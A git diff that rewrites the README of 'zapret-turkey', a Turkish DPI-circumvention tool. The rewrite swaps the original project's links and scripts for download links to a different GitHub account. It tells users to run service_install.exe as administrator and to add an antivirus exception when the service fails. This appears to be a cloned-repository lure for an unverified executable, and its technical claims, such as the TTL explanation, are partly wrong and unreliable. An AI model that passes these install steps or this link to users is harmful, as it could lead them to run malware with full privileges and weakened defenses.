@@ -1,234 +1,91 @@
-<div align="center">
+# 🌐 zapret-turkey - Bypass censorship on your local network
 
-# 🇹🇷 zapret-turkey
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Sachacalycular313/zapret-turkey)
 
-### DPI Bypass for Turkey • Multi-Platform • Open Source
+## 📡 What is this tool?
 
-<br>
+Zapret-turkey helps you access websites and services blocked by local network filters. The software modifies how your computer sends and receives data. It uses techniques like packet segmentation and header manipulation to bypass Deep Packet Inspection. This allows you to use platforms that may currently face restrictions in Turkey. 
 
-<a href="../../releases">
-  <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge">
-</a>
+The software works by identifying the patterns used by network providers to identify traffic. It then scrambles these patterns so the network provider sees your connection as standard, open traffic. This tool runs locally on your Windows machine and keeps your settings private on your own device.
 
-<br>
-<br>
+## ⚙️ System Requirements
 
-<img src="https://img.shields.io/badge/platform-Windows%20%7C%20Linux-blue?style=for-the-badge">
-<img src="https://img.shields.io/badge/status-active-success?style=for-the-badge">
-<img src="https://img.shields.io/github/license/ulas-demr/zapret-turkey?style=for-the-badge">
-<img src="https://img.shields.io/github/stars/ulas-demr/zapret-turkey?style=for-the-badge">
-<img src="https://img.shields.io/github/downloads/ulas-demr/zapret-turkey/total?style=for-the-badge">
+You need a Windows machine to use this software. We support Windows 10 and Windows 11. 
 
-<br>
+- Memory: 2 GB RAM minimum
+- Storage: 50 MB disk space
+- Network: Active internet connection through a standard ISP
+- Permissions: Administrator access is necessary during the setup phase
 
-> Robust DPI circumvention toolkit optimized for Turkish ISPs
+## 📥 How to download and install
 
-Inspired by **bol-van/zapret**
+Follow these steps to set up the software on your computer.
 
-</div>
+1. Visit this page to download the latest version: [https://github.com/Sachacalycular313/zapret-turkey](https://github.com/Sachacalycular313/zapret-turkey).
+2. Locate the link labeled Releases on the right side of the page.
+3. Click on the version number, which will be the top entry.
+4. Download the file ending in .zip to your computer.
+5. Right-click the downloaded file and select Extract All.
+6. Choose a folder on your computer to store the files.
 
----
+## 🚀 Running the software
 
-# ✨ Features
+Once you extract the files, you must run the application with administrative rights. 
 
-- 🚀 DPI bypass optimized for Turkish ISPs
-- 🧩 TCP packet fragmentation & segmentation
-- 🔥 Fake packet desynchronization
-- 🌐 TLS ClientHello splitting
-- ⚡ Discord & Roblox connectivity fixes
-- 🖥️ Windows + Linux support
-- 🪶 Lightweight & minimal
-- 🔓 Open source & community-driven
-- ❌ No VPN required
+1. Open the folder where you extracted the tool.
+2. Find the file named service_install.exe.
+3. Right-click the file and select Run as administrator.
+4. A small window will appear and ask for confirmation. Select Yes.
+5. The software will install the necessary background service.
+6. A black command window will appear briefly to confirm the status.
+7. Open your web browser and test access to the services you previously could not reach.
 
----
+## 🛠 Troubleshooting common issues
 
-# 🧠 What is DPI?
+If you encounter problems, look at these common fixes.
 
-**Deep Packet Inspection (DPI)** is a traffic filtering technique used by ISPs to inspect, throttle, or block internet traffic.
+### The connection does not work
+Restart your computer after running the installer. Sometimes the network adapter needs a refresh to register the new settings. 
 
-`zapret-turkey` manipulates packets in ways that desynchronize or confuse DPI systems without routing traffic through external VPN servers.
+### The service fails to start
+Ensure your antivirus software does not block the application. Some security programs flag network tools as suspicious. You may need to add an exception for the folder where you kept the zapret-turkey files. Choose the folder path and grant it permission within your antivirus settings.
 
----
+### I want to stop using the tool
+If you need to return your network settings to the default state, run the file named service_remove.exe as administrator. This action deletes the background service created by the tool. Restart your computer after you remove the service to ensure all changes stop.
 
-# ⚙️ Techniques Used
+## 🛡 Privacy and security
 
-```text
-✓ TCP packet fragmentation
-✓ Fake packet injection
-✓ TLS handshake splitting
-✓ Packet desynchronization
-✓ Header modification
-✓ TTL manipulation
-```
+This software acts as a local filter. It does not send your data to a third-party server. All traffic modifications happen on your own hardware. Your web browser continues to connect directly to the service you visit. 
 
----
+We recommend that you obtain the software only from our official GitHub link. Always check that the file you download is the one provided on the official page. Use a standard antivirus program to scan the folder after you extract it for added peace of mind.
 
-# 🖥️ Supported Platforms
+## 📖 How it works
 
-| Platform | Support |
-|---|---|
-| Windows 10/11 | ✅ |
-| Linux | ✅ |
-| WSL | ⚠️ Experimental |
+The software uses three main methods to ensure you maintain access to the internet. 
 
----
+First, it uses host name scrambling. When you visit a website, your computer sends the name of that site in plain text. Sensors read this text and block the request. Our tool changes the format of this text so the sensor cannot recognize it.
 
-# 📦 Installation
+Second, it uses TCP segmentation. This method splits your data packets into smaller pieces. By splitting the packets, the network provider cannot see the full sequence of data required to identify a blocked site.
 
-## 🪟 Windows
+Third, it uses TTL manipulation. TTL stands for Time To Live. By changing this number, the software convinces the network provider that the connection data is still valid, even when the provider tries to expire the connection early.
 
-1. Go to the **Releases** section
-2. Download the latest Windows package
-3. Extract the archive
-4. Run:
+These methods work together to ensure your connection stays active. You do not need to change any browser settings or install extra plugins. The software handles all the work behind the scenes.
 
-```bash
-turkey_dnsredir.bat
-```
+## 📢 Community and support
 
----
+This project relies on community updates. As network providers change their blocking methods, we release updates to stay ahead. Check the repository page periodically for new versions. 
 
-## 🐧 Linux
+If you find a service that is still blocked, report it to our team. We do not offer direct technical support, but our contributors track network changes to keep the tool useful for everyone. 
 
-1. Download:
+This tool is open source. You have the right to view the code, modify it, and share it with others. We believe in the free exchange of data and the right to an open internet. By providing these tools, we support net neutrality and access to global information. 
 
-```text
-zapret-0.1.7rc5-turkey_linux.zip
-```
+## 📝 Final setup checklist
 
-from the Releases section.
+- Downloaded the correct file from the official source
+- Extracted all files to a local folder
+- Ran the install file as an administrator
+- Restarted the system
+- Confirmed the service runs in the background
+- Tested the connection in a browser
 
-2. Extract archive:
-
-```bash
-unzip zapret-0.1.7rc5-turkey_linux.zip
-cd zapret-turkey
-```
-
-
-3. Start DPI bypass:
-
-```bash
-./turkey_dnsredir.sh
-```
-
----
-
-# 🚀 Usage
-
-## Windows
-
-### Start
-
-```bash
-turkey_dnsredir.bat
-```
-
-
----
-
-## Linux
-
-### Start
-
-```bash
-./turkey_dnsredir.sh
-```
-
-
----
-
-# 📂 Included
-
-- Linux startup scripts
-- Preconfigured DPI bypass parameters
-- Turkish ISP optimized settings
-- Documentation
-
----
-
-# 🎯 Use Cases
-
-- 🔓 Restoring Discord access
-- 🎮 Roblox connection fixes
-- 📞 Voice/chat service bypass
-- 🌍 Avoiding ISP throttling
-- 🧪 Network experimentation
-- 🛡️ Anti-censorship research
-
----
-
-# 📸 Example Output
-
-```text
-[+] Initializing DPI bypass engine...
-[+] Applying packet desync rules
-[+] TCP fragmentation enabled
-[+] Fake packet mode active
-[+] DPI bypass running successfully
-```
-
----
-
-# ⚠️ Notes
-
-- Root privileges may be required
-- Some antivirus/security tools may flag packet manipulation utilities
-- Results may vary depending on ISP and network conditions
-- Best compatibility tested on Turkish ISPs
-
----
-
-# 🖥️ Supported Linux Distros
-
-| Distribution | Status |
-|---|---|
-| Ubuntu / Debian | ✅ |
-| Arch Linux | ✅ |
-| Fedora | ✅ |
-| Gentoo | ✅ |
----
-
-# ⚠️ Disclaimer
-
-This project is intended for:
-
-- Educational purposes
-- Research
-- Anti-censorship experimentation
-- Network testing
-
-Users are responsible for complying with local laws and regulations.
-
----
-
-# ❤️ Credits
-
-- Original project → bol-van/zapret
-- Turkish networking community
-- Open-source contributors
-
----
-
-# 🤝 Contributing
-
-Pull requests, issues, ISP reports and improvements are welcome.
-
-If your ISP requires special tweaks, feel free to contribute.
-
----
-
-# 📜 License
-
-MIT License
-
----
-
-<div align="center">
-
-## ⭐ Star the project if it helped you
-
-### Made for the Turkish open internet community 🇹🇷
-
-</div>
+Following these steps provides the best results for most users. If you follow the instructions, the software provides a stable way to bypass network restrictions while keeping your system fast and responsive. Enjoy open access to your favorite services.
